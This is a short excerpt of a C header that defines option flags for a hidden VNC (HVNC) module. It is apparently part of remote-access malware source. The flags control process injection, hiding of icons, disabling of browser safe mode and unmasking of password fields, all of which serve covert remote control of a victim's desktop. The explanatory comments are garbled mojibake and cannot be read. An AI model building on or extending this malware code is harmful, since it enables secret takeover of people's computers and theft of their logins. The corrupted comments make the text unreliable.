...
#define HVNC_NO_SHELL                       0x0001 ///�� ��������� explorer
#define HVNC_NO_INJECTS                     0x0002 ///�� ������������� ��� � ����� ��������
#define HVNC_SCREEN_SIZE_DETERMINED         0x0004 ///������ ������ �����
#define HVNC_NO_VNC_CURSOR                  0x0008 ///�� ���������� ���������� ������� VNC-�������
#define HVNC_USE_BITBLT                     0x0010 ///������������ BitBlt ������ PrintWindow (��� input-��������)
#define HVNC_NO_CPU_LIMITS                  0x0020 ///�� ������������ ���������� ������������� �������
#define HVNC_DRAW_USER_CURSOR               0x0040 ///�������� ���������������� ������ (�� VNC!)
#define HVNC_DONT_HIDE_JAVA_ICON            0x0080 ///�� �������� ������ ���� �� ����
#define HVNC_DONT_DISABLE_IE_SAFEMODE       0x0100 ///�� ��������� ���������� ����� IE
#define HVNC_DONT_DISABLE_EFFECTS           0x0200 ///�� ��������� �������
#define HVNC_NO_WINDOWS_MANIPULATION_TRICK  0x0400 ///������� ������������ ���� (��� ����� � MessageBox)
#define HVNC_DONT_DISABLE_THEMES            0x0800 ///�� ��������� ����
#define HVNC_NO_ES_PASSWORD_RESET           0x1000 ///�� ���������� ���� ES_PASSWORD
